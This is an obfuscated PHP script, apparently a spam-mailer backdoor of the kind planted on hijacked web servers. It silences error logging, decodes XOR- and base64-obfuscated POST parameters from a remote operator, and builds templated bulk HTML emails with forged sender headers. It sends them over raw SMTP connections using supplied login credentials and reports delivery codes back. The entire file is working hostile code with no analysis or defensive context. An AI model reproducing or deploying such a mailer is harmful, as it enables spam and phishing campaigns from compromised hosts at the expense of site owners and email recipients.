<?php @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); if (function_exists('stream_socket_enable_crypto')) { if (function_exists('fsockopen') || function_exists('pfsockopen') || function_exists('stream_socket_client')) { true; } else { die(PHP_OS."99+".sha1(0987654321)); } } else { die(PHP_OS."98+".sha1(0987654321)); } if (count($_POST) < 4) { die(PHP_OS."10+".sha1(0987654321)); } foreach (array_keys($_POST) as $v7d296492) { switch ($v7d296492[0]) { case 'l': $v93ceb796 = $v7d296492; break; case 'd': $vacf9cae1 = $v7d296492; break; case 'e': $vbf163f4e = $v7d296492; break; case 'p': $vdce0b27b = $v7d296492; break; case 'm': $vf2d46be4 = $v7d296492; break; } } if ($v93ceb796 === '' || $vacf9cae1 === '' || $vbf163f4e == '' || $vdce0b27b === '') die(PHP_OS."11+".sha1(0987654321)); $v134c3dd5 = urldecode(stripslashes(n95c1910d(@$_POST[$v93ceb796]))); $vacf9cae1 = urldecode(stripslashes(n95c1910d(@$_POST[$vacf9cae1]))); $vf2d46be4 = urldecode(stripslashes(n95c1910d(@$_POST[$vf2d46be4]))); $vbf163f4e = urldecode(stripslashes(n95c1910d(@$_POST[$vbf163f4e]))); $vdce0b27b = urldecode(stripslashes(n95c1910d(@$_POST[$vdce0b27b]))); if (strpos($v134c3dd5, '#', 1) != false) { $vd2b06a3b = preg_split('/#/', $v134c3dd5); $vd450dd5b = count($vd2b06a3b); } else { $vd2b06a3b[0] = $v134c3dd5; $vd450dd5b = 1; } for ($vfbd2601d=0; $vfbd2601d < $vd450dd5b;$vfbd2601d++) { $v134c3dd5 = $vd2b06a3b[$vfbd2601d]; if ($v134c3dd5 == '' || !strpos($v134c3dd5,'@',1)) continue; if (strpos($v134c3dd5, ';', 1) != false) { list($vd097a792, $v1333a625, $v7b48ec89) = preg_split('/;/',strtolower($v134c3dd5)); $vd097a792 = ucfirst($vd097a792); $v1333a625 = ucfirst($v1333a625); if ($v1333a625 == '' || $vd097a792 == '') { $v1333a625 = $vd097a792 = ''; $v134c3dd5 = $v7b48ec89; } else { $v134c3dd5 = "\"$vd097a792 $v1333a625\" <$v7b48ec89>"; } } else { $v1333a625 = $vd097a792 = ''; $v7b48ec89 = strtolower($v134c3dd5); } preg_match('|<USER>(.*)</USER>|imsU', $vacf9cae1, $v60bddb16); $v60bddb16 = $v60bddb16[1]; preg_match('|<NAME>(.*)</NAME>|imsU', $vacf9cae1, $vbe17aa45); $vbe17aa45 = $vbe17aa45[1]; preg_match('|<SUBJ>(.*)</SUBJ>|imsU', $vacf9cae1, $v5e9551d5); $v5e9551d5 = $v5e9551d5[1]; preg_match('|<SBODY>(.*)</SBODY>|imsU', $vacf9cae1, $vfa5dd458); $vfa5dd458= $vfa5dd458[1]; $v5e9551d5 = str_replace("%R_NAME%", $vd097a792, $v5e9551d5); $v5e9551d5 = str_replace("%R_LNAME%", $v1333a625, $v5e9551d5); $vfa5dd458 = str_replace("%R_NAME%", $vd097a792, $vfa5dd458); $vfa5dd458 = str_replace("%R_LNAME%", $v1333a625, $vfa5dd458); $v1daf2895 = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']); if ($vbe17aa45 != '') $v0ba5a025 = "$vbe17aa45 <$vbf163f4e>"; else $v0ba5a025 = $vbf163f4e; $v807a6fd2 = "From: $v0ba5a025\r\n"; $v807a6fd2 .= "Reply-To: $v0ba5a025\r\n"; $ve69d4884 = "X-Priority: 3 (Normal)\r\n"; $ve69d4884 .= "MIME-Version: 1.0\r\n"; $ve69d4884 .= "Content-Type: text/html; charset=\"iso-8859-1\"\r\n"; $ve69d4884 .= "Content-Transfer-Encoding: 8bit\r\n"; $v0c3a165c = "Date: " . @date("D, j M Y G:i:s O")."\r\n" . $v807a6fd2; $v0c3a165c .= "Message-ID: <".preg_replace('/(.{7})(.{5})(.{2}).*/', '$1-$2-$3', md5(time()))."@$v1daf2895>\r\n"; $v0c3a165c .= "To: $v134c3dd5\r\n"; $v0c3a165c .= "Subject: $v5e9551d5\r\n"; $v0c3a165c .= $ve69d4884; $v50026d62 = $v0c3a165c."\r\n".$vfa5dd458; if ($vf2d46be4 == '') $vf2d46be4 = n9f48a5e5(next(explode('@', $vbf163f4e))); if (($v9ce542d5 = n3276d6d0($vbf163f4e, $vdce0b27b, $v7b48ec89, $v50026d62, $v1daf2895, $vf2d46be4)) == 0) { echo("OK".sha1(1234567890)."+1\n"); continue; } else { echo PHP_OS."20".'+'.sha1(0987654321)."+$v9ce542d5\n"; } } function n3276d6d0($vbf163f4e, $vdce0b27b, $v134c3dd5, $v50026d62, $v1daf2895, $vf2d46be4) { if (function_exists('fsockopen')) $v15579eb4 = @fsockopen($vf2d46be4, 25, $v62bd3090, $vab2b64a5, 20); elseif (function_exists('pfsockopen')) $v15579eb4 = @pfsockopen($vf2d46be4, 25, $v62bd3090, $vab2b64a5, 20); elseif (function_exists('stream_socket_client')) $v15579eb4 = @stream_socket_client("tcp://$vf2d46be4:25", $v62bd3090, $vab2b64a5, 20); else return -1; if (!$v15579eb4) { return 1; } else { n3465bfbc($v15579eb4); @fputs($v15579eb4, "EHLO $v1daf2895\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 250) return "2+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); if (preg_match('/STARTTLS/m', $va56971b7) && function_exists('stream_socket_enable_crypto')) { print "STARTTLS\n"; @fputs($v15579eb4, "STARTTLS\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 220) return "22+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); stream_socket_enable_crypto($v15579eb4, true, STREAM_CRYPTO_METHOD_TLS_CLIENT); @fputs($v15579eb4, "EHLO $v1daf2895\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 250) return "23+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); } @fputs($v15579eb4, "AUTH LOGIN\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 334) return "3+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); @fputs($v15579eb4, base64_encode($vbf163f4e)."\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 334) return "4+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); @fputs($v15579eb4, base64_encode($vdce0b27b)."\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 235) return "5+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); @fputs($v15579eb4, "MAIL FROM:<$vbf163f4e>\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 250) return "6+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); @fputs($v15579eb4, "RCPT TO:<$v134c3dd5>\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 250 && substr($va56971b7, 0, 3) != 251) return "7+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); @fputs($v15579eb4, "DATA\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 354) return "8+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); @fputs($v15579eb4, $v50026d62."\r\n.\r\n"); $va56971b7 = n3465bfbc($v15579eb4); if (substr($va56971b7, 0, 3) != 250) return "9+($v134c3dd5)+".preg_replace('/(\r\n|\r|\n)/', '|', $va56971b7); @fputs($v15579eb4, "QUIT\r\n"); @fclose($v15579eb4); return 0; } } function n3465bfbc($v15579eb4) { $vacf9cae1 = ''; while($v104e1fa5 = @fgets($v15579eb4, 256)) { $vacf9cae1 .= $v104e1fa5; if(substr($v104e1fa5, 3, 1) == ' ') break; } return $vacf9cae1; } function n9f48a5e5($vd0383085) { if (function_exists("getmxrr")) { @getmxrr($vd0383085, $v41940316, $v73df290b); if (count($v41940316) === 0) return $vd0383085; $vfbd2601d = array_keys($v73df290b, min($v73df290b)); return $v41940316[$vfbd2601d[0]]; } else { return $vd0383085; } } function n95c1910d($v6ef9045b) { $v6ef9045b = base64_decode($v6ef9045b); $vc6a251c0 = ''; for($vfbd2601d = 0; $vfbd2601d < strlen($v6ef9045b); $vfbd2601d++) $vc6a251c0 .= chr(ord($v6ef9045b[$vfbd2601d]) ^ 2); return $vc6a251c0; } ?> 